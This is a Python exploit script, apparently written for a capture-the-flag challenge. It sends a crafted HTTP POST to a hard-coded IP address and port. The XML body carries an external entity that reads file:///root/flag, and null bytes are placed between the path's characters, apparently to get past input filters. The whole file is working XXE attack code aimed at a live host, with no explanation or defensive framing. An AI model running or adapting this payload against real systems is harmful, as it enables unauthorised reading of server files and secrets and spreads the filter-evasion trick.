#!/usr/bin/env python3

import socket, sys, time

HOST = "54.72.82.22"
PORT = 8031
TIMEOUT = 10

# Building XML with null bytes inside the SYSTEM path
#  keep outer XML as utf-8 but insert literal \x00 bytes into the SYSTEM URI bytes
pre = '<?xml version="1.0"?><!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///'
mid = b"".join([c.encode() + b"\x00" for c in "root/flag"])  # r\x00o\x00o...
post = b'"> ]><request><id>&xxe;</id></request>'

# Combine (pre and post are utf-8 str -> bytes)
payload = pre.encode() + mid + post

req_lines = [
    "POST /fetch_user HTTP/1.1",
    f"Host: {HOST}:{PORT}",
    "User-Agent: null-inserter/1.0",
    "Accept: */*",
    "Content-Type: application/xml",
    f"Content-Length: {len(payload)}",
    "Connection: close",
    "",
    ""
]

request = ("\r\n".join(req_lines)).encode() + payload

try:
    s = socket.create_connection((HOST, PORT), timeout=TIMEOUT)
    s.sendall(request)
    s.settimeout(TIMEOUT)
    resp = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        resp += chunk
    s.close()
    print(resp.decode(errors="replace"))
except socket.timeout:
    print("timeout")
except Exception as e:
    print("error:", e)
    sys.exit(1)
